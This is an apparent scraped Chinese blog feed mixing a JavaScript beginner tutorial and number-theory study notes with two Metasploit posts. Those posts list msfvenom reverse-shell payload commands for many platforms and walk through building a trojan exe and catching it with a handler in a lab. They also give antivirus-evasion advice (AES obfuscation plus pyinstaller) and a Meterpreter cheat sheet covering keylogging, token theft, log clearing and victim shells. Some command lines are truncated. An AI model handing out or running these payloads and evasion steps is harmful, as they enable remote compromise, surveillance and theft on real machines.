<li><strong><code>innerHTML = &quot;段落已修改。&quot;</code>：</strong> 是用于修改元素的 HTML 内容(innerHTML)的 JavaScript 代码。</li>
</ol>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（4） console.log() 写到控制台。</strong></font></p>
<p>如果您的浏览器支持调试，你可以使用 console.log() 方法在浏览器中显示 JavaScript 值。</p>
<p>浏览器中使用 F12 来启用调试模式， 在调试窗口中点击 “Console” 菜单。</p>
<p><strong>Tip：</strong>程序中调试是测试，查找及减少bug(错误)的过程。</p>
<br />

<p>下面实例代码先写到一个 .html的文档里，然后在浏览器运行这个文档。运行后启用调试模式点击”Console” 菜单即可看到输出结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;输出到控制台&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/12/5c8787ce408d7.jpg&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;注意要启动调试模式&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">浏览器中(Chrome, IE, Firefox) 使用 F12 来启用调试模式， 在调试窗口中点击 <span class="string">&quot;Console&quot;</span> 菜单。</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">a = <span class="number">5</span>;</span><br><span class="line">b = <span class="number">6</span>;</span><br><span class="line">c = a + b;</span><br><span class="line">console.log(c);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/12/5c8788a01fd0b.png" alt="5.png"></p>
<br />

<br />

<h3 id="二-JavaScript-语法"><a href="#二-JavaScript-语法" class="headerlink" title="二. JavaScript 语法"></a><font color="#FF6347" face="Comic sans MS">二. JavaScript 语法</font></h3><br />

<h4 id="2-1-基本法则"><a href="#2-1-基本法则" class="headerlink" title="2.1 基本法则"></a><font color="#3CB371" face="Comic sans MS">2.1 基本法则</font></h4><blockquote>
<ol>
<li><strong>声明变量：</strong>使用关键字**<code>var</code>**，如：<code>var name; var num=12;</code></li>
<li><strong>命名规则：</strong>变量名不能以数字开头，可以是字母或下划线开头。变量名可以包含字母、数字、下划线。</li>
<li><strong>大小写敏感：</strong>JS中的变量名是区分大小写的。</li>
<li><strong>驼峰式命名：</strong>第一个单词全小写，后面的每一个单词首字母大写。如：**<code>var  getUserName;</code>**</li>
<li><strong>语句块：</strong>花括号**<code>&#123;...&#125;</code>**，JavaScript的语法和Java语言类似</li>
<li><strong>语句结束符：</strong>英文分号**<code>;</code>**，JavaScript的语法和Java语言类似</li>
<li><strong>缩进：</strong>花括号{…}内的语句具有缩进，通常是4个空格，并不强制使用。缩进有助于我们理解代码的层次。</li>
<li><strong>注释：</strong>单行**<code>//</code><strong>，多行</strong><code>/*...*/</code>**，不是所有的 JavaScript 语句都是”命令”。</li>
<li><strong>空格：</strong>JavaScript 会忽略多余的空格。可以向脚本添加空格，来提高其可读性。</li>
<li><strong>一行：</strong>一行代码可包含多个语句，每个语句用**<code>;</code>**表示语句结束。但 不建议一行写多个语句!（因为要层次感）</li>
<li><strong>多行：</strong>文本字符串中使用反斜杠**<code>\</code>**对代码行进行换行。但是只能字符串使用，变量名函数名等其他不能使用。</li>
</ol>
</blockquote>
<p>如：<br><code>document.write(&quot;你好 \</code><br><code>世界!&quot;);</code></p>
<p><strong>提示：</strong>JavaScript 是脚本语言。浏览器会在读取代码时，逐行地执行脚本代码。而对于传统编程来说，会在执行前对所有代码进行编译。</p>
<br />

<p><font color="#FF7F00"><strong>Tip1：</strong></font>以下是 JavaScript 中最​​重要的保留字（按字母顺序）：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c87933bee96c.png" alt="6.png"></p>
<br />

<p><font color="#FF7F00"><strong>Tip2：</strong></font>JavaScript 有多种数据类型：数字，字符串，数组，对象等等（在编程语言中，一般固定值称为字面量，如 3.14。）：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> length = <span class="number">16</span>;                                  <span class="comment">// Number 通过数字字面量赋值 </span></span><br><span class="line"><span class="keyword">var</span> points = x * <span class="number">10</span>;                              <span class="comment">// Number 通过表达式字面量赋值</span></span><br><span class="line"><span class="keyword">var</span> lastName = <span class="string">&quot;Johnson&quot;</span>;                         <span class="comment">// String 通过字符串字面量赋值</span></span><br><span class="line"><span class="keyword">var</span> cars = [<span class="string">&quot;Saab&quot;</span>, <span class="string">&quot;Volvo&quot;</span>, <span class="string">&quot;BMW&quot;</span>];              <span class="comment">// Array  通过数组字面量赋值</span></span><br><span class="line"><span class="keyword">var</span> person = &#123;<span class="attr">firstName</span>:<span class="string">&quot;John&quot;</span>, <span class="attr">lastName</span>:<span class="string">&quot;Doe&quot;</span>&#125;;  <span class="comment">// Object 通过对象字面量赋值</span></span><br></pre></td></tr></table></figure>

<br />

<p><font color="#FF7F00"><strong>Tip3：</strong></font>JavaScript 语句通常以一个 语句标识符 为开始，并执行该语句。语句标识符是保留关键字不能作为变量名使用。</p>
<p>下表列出了 JavaScript 语句标识符 (关键字) ：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c87953d930f2.png" alt="7.png"></p>
<p><font color="#FF7F00"></font></p>
<br />

<h4 id="2-2-变量和数据类型"><a href="#2-2-变量和数据类型" class="headerlink" title="2.2 变量和数据类型"></a><font color="#3CB371" face="Comic sans MS">2.2 变量和数据类型</font></h4><br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（1） 变量</strong></font></p>
<p>变量是有数据类型的，这个类型来源于“变量的值”，换句话说：值是什么类型的，变量就是什么类型的。</p>
<p>这种变量本身类型不固定的语言称之为动态语言，与之对应的是静态语言。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下：</p>
<p>int a = 123; // a是整数类型变量，类型用int申明a = “ABC”; // 错误：不能把字符串赋给整型变量</p>
<p>和静态语言相比，动态语言更灵活，就是这个原因。</p>
<blockquote>
<p><font color="#FF7F00"><strong>变量命名规则：</strong></font></p>
</blockquote>
<ol>
<li>变量必须以字母开头</li>
<li>变量也能以 $ 和 _ 符号开头（不过我们不推荐这么做）</li>
<li>变量名称对大小写敏感（y 和 Y 是不同的变量）</li>
</ol>
<br />

<p>您可以在一条语句中声明很多变量。该语句以 var 开头，并使用逗号分隔变量即可：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lastname=<span class="string">&quot;Doe&quot;</span>, age=<span class="number">30</span>, job=<span class="string">&quot;carpenter&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>声明也可横跨多行：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lastname=<span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">age=<span class="number">30</span>,</span><br><span class="line">job=<span class="string">&quot;carpenter&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>但是一条语句中声明的多个不可以赋同一个值（x,y 为 undefined， z 为 14。）：）:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x,y,z=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（2） 数据类型</strong></font></p>
<p><font color="#FF7F00"><strong>JS中八种数据类型：</strong></font>Number（数值型）、String（字符串）、bool（布尔型）、undefined、null、array、object、function</p>
<p>这八种数据类型，又分为两大类：</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown</title>
    <url>/post/MarkdownUsage/</url>
    <content><![CDATA[<p><a href="http://marxi.co/">1.Markdown在线编辑器</a></p>
<p><a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown">2.Markdown高级语法大全</a></p>
<p><a href="https://www.zybuluo.com/mdeditor">3.Markdown高级语法</a></p>
<hr>
<hr>
]]></content>
  </entry>
  <entry>
    <title>信息安全数学基础复习笔记</title>
    <url>/post/Mathematical-basis/</url>
    <content><![CDATA[<p>&nbsp;<font face="楷体">12.3复习笔记</font></p>
<h4 id="第一章、整数的可除性"><a href="#第一章、整数的可除性" class="headerlink" title="第一章、整数的可除性"></a><font face="楷体">第一章、整数的可除性</font></h4><h5 id="1-1-整数的概念、欧几里得除法"><a href="#1-1-整数的概念、欧几里得除法" class="headerlink" title="1.1 整数的概念、欧几里得除法"></a><font face="楷体">1.1 整数的概念、欧几里得除法</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FM6Bwj.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FM6Bwj.jpg" alt="1"></a><br><a href="https://s1.ax1x.com/2018/12/03/FM6hm4.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FM6hm4.jpg" alt="2"></a><br>&nbsp;</p>
<h5 id="1-2-最大公因数与广义欧几里得除法"><a href="#1-2-最大公因数与广义欧几里得除法" class="headerlink" title="1.2 最大公因数与广义欧几里得除法"></a><font face="楷体">1.2 最大公因数与广义欧几里得除法</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FM6v0H.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FM6v0H.jpg" alt="3"></a><br><a href="https://s1.ax1x.com/2018/12/03/FMcSAA.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcSAA.jpg" alt="4"></a><br>&nbsp;</p>
<h5 id="1-3-整除的进一步性质及最小公倍数"><a href="#1-3-整除的进一步性质及最小公倍数" class="headerlink" title="1.3 整除的进一步性质及最小公倍数"></a><font face="楷体">1.3 整除的进一步性质及最小公倍数</font></h5><h5 id="1-4-整数分解"><a href="#1-4-整数分解" class="headerlink" title="1.4 整数分解"></a><font face="楷体">1.4 整数分解</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMcFc8.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcFc8.jpg" alt="5"></a><br>&nbsp;</p>
<h5 id="1-5-素数的算术基本定理"><a href="#1-5-素数的算术基本定理" class="headerlink" title="1.5 素数的算术基本定理"></a><font face="楷体">1.5 素数的算术基本定理</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMc8uF.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMc8uF.jpg" alt="6"></a></p>
<p>&nbsp;<br>&nbsp;</p>
<h4 id="第二章、同余"><a href="#第二章、同余" class="headerlink" title="第二章、同余"></a><font face="楷体">第二章、同余</font></h4><h5 id="2-1-同余的概念及基本性质"><a href="#2-1-同余的概念及基本性质" class="headerlink" title="2.1 同余的概念及基本性质"></a><font face="楷体">2.1 同余的概念及基本性质</font></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMcIKS.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcIKS.jpg" alt="7"></a><br><a href="https://s1.ax1x.com/2018/12/03/FMcTbQ.jpg"><img data-src="https://s1.ax1x.com/2018/12/03/FMcTbQ.jpg" alt="8"></a><br>&nbsp;</p>
<h5 id="2-2-剩余类及完全剩余系"><a href="#2-2-剩余类及完全剩余系" class="headerlink" title="2.2 剩余类及完全剩余系"></a><font face="楷体">2.2 剩余类及完全剩余系</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8N4wn.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8N4wn.jpg" alt="9"></a><br>&nbsp;</p>
<h5 id="2-3-简化剩余系与欧拉函数"><a href="#2-3-简化剩余系与欧拉函数" class="headerlink" title="2.3 简化剩余系与欧拉函数"></a><font face="楷体">2.3 简化剩余系与欧拉函数</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8N7WT.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8N7WT.jpg" alt="10"></a><br>&nbsp;</p>
<h5 id="2-4-欧拉定理、费马小定理、Wilson定理"><a href="#2-4-欧拉定理、费马小定理、Wilson定理" class="headerlink" title="2.4 欧拉定理、费马小定理、Wilson定理"></a><font face="楷体">2.4 欧拉定理、费马小定理、Wilson定理</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Njm9.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8Njm9.jpg" alt="11"></a><br>&nbsp;</p>
<h5 id="2-5-模重复平方算法"><a href="#2-5-模重复平方算法" class="headerlink" title="2.5 模重复平方算法"></a><font face="楷体">2.5 模重复平方算法</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8NxT1.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8NxT1.jpg" alt="12"></a></p>
<p>&nbsp;<br>&nbsp;<br><font face="楷体">12.5复习笔记</font></p>
<h4 id="第三章、同余式"><a href="#第三章、同余式" class="headerlink" title="第三章、同余式"></a><font face="楷体">第三章、同余式</font></h4><h5 id="3-1-基本概念及一次同余式"><a href="#3-1-基本概念及一次同余式" class="headerlink" title="3.1 基本概念及一次同余式"></a><font face="楷体">3.1 基本概念及一次同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UpY6.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UpY6.jpg" alt="13"></a><br>&nbsp;</p>
<h5 id="3-2-中国剩余定理"><a href="#3-2-中国剩余定理" class="headerlink" title="3.2 中国剩余定理"></a><font face="楷体">3.2 中国剩余定理</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UF6e.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UF6e.jpg" alt="14"></a><br>&nbsp;</p>
<h5 id="3-3-高次同余式的解法及解数"><a href="#3-3-高次同余式的解法及解数" class="headerlink" title="3.3 高次同余式的解法及解数"></a><font face="楷体">3.3 高次同余式的解法及解数</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UV0A.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UV0A.jpg" alt="15"></a><br>&nbsp;</p>
<h5 id="3-4-素数模的同余式"><a href="#3-4-素数模的同余式" class="headerlink" title="3.4 素数模的同余式"></a><font face="楷体">3.4 素数模的同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Utkq.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8Utkq.jpg" alt="16"></a></p>
<p>&nbsp;<br>&nbsp;</p>
<h4 id="第四章、二次同余式与平方剩余"><a href="#第四章、二次同余式与平方剩余" class="headerlink" title="第四章、二次同余式与平方剩余"></a><font face="楷体">第四章、二次同余式与平方剩余</font></h4><h5 id="4-1-一般二次同余式"><a href="#4-1-一般二次同余式" class="headerlink" title="4.1 一般二次同余式"></a><font face="楷体">4.1 一般二次同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UBX4.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UBX4.jpg" alt="17"></a><br>&nbsp;</p>
<h5 id="4-2-模为奇素数的平方剩余与平方剩余"><a href="#4-2-模为奇素数的平方剩余与平方剩余" class="headerlink" title="4.2 模为奇素数的平方剩余与平方剩余"></a><font face="楷体">4.2 模为奇素数的平方剩余与平方剩余</font></h5><h5 id="4-3-勒让得符号"><a href="#4-3-勒让得符号" class="headerlink" title="4.3 勒让得符号"></a><font face="楷体">4.3 勒让得符号</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Uy7R.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8Uy7R.jpg" alt="18"></a><br>&nbsp;</p>
<h5 id="4-4-二次互反律"><a href="#4-4-二次互反律" class="headerlink" title="4.4 二次互反律"></a><font face="楷体">4.4 二次互反律</font></h5><h5 id="4-5-雅可比符号"><a href="#4-5-雅可比符号" class="headerlink" title="4.5 雅可比符号"></a><font face="楷体">4.5 雅可比符号</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UjgS.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UjgS.jpg" alt="19"></a></p>
<p>&nbsp;<br>&nbsp;</p>
<h4 id="第五章、原根与指标"><a href="#第五章、原根与指标" class="headerlink" title="第五章、原根与指标"></a><font face="楷体">第五章、原根与指标</font></h4><h5 id="5-1-指数及基本性质"><a href="#5-1-指数及基本性质" class="headerlink" title="5.1 指数及基本性质"></a><font face="楷体">5.1 指数及基本性质</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UzuQ.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8UzuQ.jpg" alt="20"></a><br><a href="https://s1.ax1x.com/2018/12/09/F8apHs.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8apHs.jpg" alt="21"></a><br>&nbsp;</p>
<h5 id="5-2-原根"><a href="#5-2-原根" class="headerlink" title="5.2 原根"></a><font face="楷体">5.2 原根</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8anb9.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8anb9.jpg" alt="22"></a><br>&nbsp;</p>
<h5 id="5-3-指标及n次同余式"><a href="#5-3-指标及n次同余式" class="headerlink" title="5.3 指标及n次同余式"></a><font face="楷体">5.3 指标及n次同余式</font></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8a38K.jpg"><img data-src="https://s1.ax1x.com/2018/12/09/F8a38K.jpg" alt="23"></a><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>信安数学</tag>
      </tags>
  </entry>
  <entry>
    <title>msfvenom生成各类Payload命令，远程木马攻击</title>
    <url>/post/Metasploit1/</url>
    <content><![CDATA[<h4 id="msfvenom生成各类Payload命令"><a href="#msfvenom生成各类Payload命令" class="headerlink" title="   msfvenom生成各类Payload命令"></a><font face="Arial">   msfvenom生成各类Payload命令</font></h4><blockquote>
<p><font face="Arial">Often one of the most useful(and to the beginner underrated) abilities of Metasploit is the  msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address(LAN IP if  attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</font></p>
</blockquote>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><p><font face="Arial">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf &gt; shell.elf</font></p>
<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p><font face="Arial">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe &gt; shell.exe</font></p>
<h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><p><font face="Arial">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho &gt; shell.macho</font></p>
<h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><p><font face="Arial">msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.php</font></p>
<p><font face="Arial">cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</font></p>
<h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><p><font face="Arial">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp &gt; shell.asp</font></p>
<h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><p><font face="Arial">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.jsp</font></p>
<h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><p><font face="Arial">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war &gt; shell.war                    Scripting Payloads</font></p>
<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.py</font></p>
<h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.sh</font></p>
<h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.pl</font></p>
<h5 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h5><p><font face="Arial">For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</font></p>
<h5 id="Linux-Based-Shellcode"><a href="#Linux-Based-Shellcode" class="headerlink" title="Linux Based Shellcode"></a>Linux Based Shellcode</h5><p><font face="Arial">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></font></p>
<h5 id="Windows-Based-Shellcode"><a href="#Windows-Based-Shellcode" class="headerlink" title="Windows Based Shellcode"></a>Windows Based Shellcode</h5><p>Your IP Address&gt; LPORT=<Your Port to Connect On> -f  language    “language放在&lt;&gt;里”<br></font></p>
<h5 id="Mac-Based-Shellcode"><a href="#Mac-Based-Shellcode" class="headerlink" title="Mac Based Shellcode"></a>Mac Based Shellcode</h5><p><font face="Arial">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></font></p>
<h5 id="Handlers模块"><a href="#Handlers模块" class="headerlink" title="Handlers模块"></a><font face="Arial">Handlers模块</h5><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</font></p>
<blockquote>
<p><font face="Arial">use exploit/multi/handler</font><br> <font face="Arial">set LHOST <LHOST value></font><br> <font face="Arial">set LPORT <LPORT value></font><br> <font face="Arial">exploit -j -z</font><br> <font face="Arial">Once the required values are completed the following command will </font>execute your handler – ‘msfconsole -L -r ‘</font></p>
</blockquote>
<hr>
<p>&nbsp;<br>&nbsp;<br><strong>下面以一个实例说明使用方法</strong></p>
<p>Metasploit之我的远程控制软件<br>参考文献：<a href="http://www.evil0x.com/posts/838.html">Metasploit渗透测试笔记(Meterpreter篇</a></p>
<p>远程控制软件–&gt;远控后门木马程序</p>
<p>木马程序–&gt;控制端（攻击者）–&gt;服务端（攻击目标）</p>
<p>测试环境：<br>攻击者：kali-linux    –&gt;192.168.2.146<br>受害者：Windows07     –&gt;192.168.2.107</p>
<p>以下为kali-linux-2.0系统下的生成与连接方式（使用msfvenom命令的）<br><a href="http://www.77169.com/hack/201602/224112.shtm">参考文献一</a><br><a href="http://www.i0day.com/1173.html">类似文献二</a></p>
<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的ip LPORT=你的端口 -f exe -o payload.exe</p>
<p>以上就是基本命令，解释一下，-p后面是payload名称，然后是你的ip和端口(payload参数)，然后是-f 格式，由于是实验就先设置exe，然后-o payload.exe指保存为payload.exe。当然，实验的时候可以把格式设置成exe，但是实战的时候毕竟有杀毒软件，所以格式最好是jar，jar就要求对方有java环境，可以用来拿java web网站的时候使用，或者设置成python然后自行shellcode免杀，即用Python容器，然后用AES混淆Python代码，再用pyinstaller编译exe，这是目前最完美的过杀毒软件方案，就连勒索软件都不会被杀毒软件干掉，除非有特殊动作，比如修改注册表。当然，楼主还有很多要学习。</p>
<p>具体步骤如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=44444 -f exe -o test.exe            </span><br></pre></td></tr></table></figure>
<p>–&gt;在当前目录下生成木马程序test.exe，PS：生成payload.exe不会被杀，test.exe被秒杀</p>
<p>PS:之后的操作步骤是和上面的一样的↓</p>
<p>之后在metasploit下连接后门程序，步骤如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole                  --&gt;开启metasploit</span><br><span class="line">use exploit/multi/handler       --&gt;使用“exploit/multi/handler”这个模块连接后门程序</span><br><span class="line">show options   --&gt;查看需要设置的配置信息//这里其实不需要配置任何信息的</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp    --&gt;使用tcp反向连接</span><br><span class="line">show options               --&gt;查看需要设置的配置信息</span><br><span class="line"><span class="built_in">set</span> LHOST=192.168.2.146    --&gt;设置我们攻击者自己的连接IP</span><br><span class="line"><span class="built_in">set</span> LPORT=44444            --&gt;设置我们攻击浙自己的连接端口</span><br><span class="line">exploit                    --&gt;执行连接，等待木马执行后连接</span><br></pre></td></tr></table></figure>

<p>PS：远程木马被执行后接着可以直接“shell”命令拿下shell</p>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>OK，完成了！<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msfvenom</tag>
        <tag>远程木马攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit工具Meterpreter的命令速查表</title>
    <url>/post/Metasploit2/</url>
    <content><![CDATA[<p>&nbsp;<br>&nbsp;</p>
<h4 id="msfpayload反弹shell使用的一些命令集"><a href="#msfpayload反弹shell使用的一些命令集" class="headerlink" title="msfpayload反弹shell使用的一些命令集"></a><font face="楷体">msfpayload反弹shell使用的一些命令集</font></h4><p>&nbsp;</p>
<h5 id="一、核心命令-–-帮助菜单"><a href="#一、核心命令-–-帮助菜单" class="headerlink" title="一、核心命令 – 帮助菜单"></a>一、核心命令 – 帮助菜单<font face="Arail"></h5><blockquote>
<blockquote>
<p><font color="#dd0000">background</font> – 将当前会话移动到背景变成一个session，当再次使用时再用sessions -i ID调用<br>bgkill – 杀死一个背景 meterpreter 脚本<br>bglist – 提供所有正在运行的后台脚本的列表<br>bgrun – 作为一个后台线程运行脚本<br>channel – 显示活动频道<br>close – 关闭通道<br>exit – 终止 meterpreter 会话<br>help – 帮助菜单<br>interact – 与通道进行交互<br>irb – 进入 Ruby 脚本模式<br><font color="#dd0000">migrate</font> – 移动到一个指定的 PID 的活动进程<br>quit – 终止 meterpreter 会话<br>read – 从通道读取数据<br><font color="#dd0000">run</font> – 执行以后它选定的 meterpreter 脚本<br>use – 加载 meterpreter 的扩展<br>write – 将数据写入到一个通道<br></font></p>
</blockquote>
</blockquote>
<h4 id="二、文件系统命令"><a href="#二、文件系统命令" class="headerlink" title="二、文件系统命令"></a><font color="#dd0000">二、文件系统命令</font><font face="Arail"></h4><blockquote>
<blockquote>
<p>cat -读取并输出到标准输出文件的内容<br>cd -更改目录对受害人<br>del -删除文件对受害人<br>download-从受害者系统文件下载<br>edit-用 vim编辑文件<br>getlwd -打印本地目录<br>getwd -打印工作目录<br>lcd -更改本地目录<br>lpwd -打印本地目录<br>ls -列出在当前目录中的文件列表<br>mkdir -在受害者系统上的创建目录<br>pwd -输出工作目录<br>rm -删除文件<br>rmdir -受害者系统上删除目录<br>upload-从攻击者的系统往受害者系统上传文件<br></font></p>
</blockquote>
</blockquote>
<h4 id="三、网络命令"><a href="#三、网络命令" class="headerlink" title="三、网络命令"></a>三、网络命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>portfwd -端口转发<br>route -查看或修改受害者路由表<br></font></p>
</blockquote>
</blockquote>
<h4 id="四、系统命令"><a href="#四、系统命令" class="headerlink" title="四、系统命令"></a>四、系统命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>clearav -清除了受害者的计算机上的事件日志<br>drop_token -被盗的令牌<br>execute-执行命令<br>getpid -获取当前进程 ID (PID)<br>getprivs -尽可能获取尽可能多的特权<br>getuid -获取作为运行服务器的用户<br>kill -终止指定 PID 的进程<br><font color="#dd0000">ps</font> -列出正在运行的进程<br>reboot-重新启动受害人的计算机<br>reg -与受害人的注册表进行交互<br>rev2self -在受害者机器上调用 RevertToSelf()<br><font color="#dd0000">shell</font> -在受害者计算机上打开一个shell<br>shutdown-关闭了受害者的计算机<br>steal_token -试图窃取指定的 (PID) 进程的令牌<br>sysinfo -获取有关受害者计算机操作系统和名称等的详细信息<br></font></p>
</blockquote>
</blockquote>
<h5 id="五、用户界面命令"><a href="#五、用户界面命令" class="headerlink" title="五、用户界面命令"></a>五、用户界面命令<font face="Arail"></h5><blockquote>
<blockquote>
<p>enumdesktops -列出所有可访问台式机<br>getdesktop -获取当前的 meterpreter 桌面<br>idletime -检查长时间以来，受害者系统空闲进程<br>keyscan_dump -键盘记录软件的内容转储<br>keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件<br>keyscan_stop -停止键盘记录软件<br>screenshot-抓去 meterpreter 桌面的屏幕截图<br>set_desktop -更改 meterpreter 桌面<br>uictl -启用用户界面组件的一些控件<br></font></p>
</blockquote>
</blockquote>
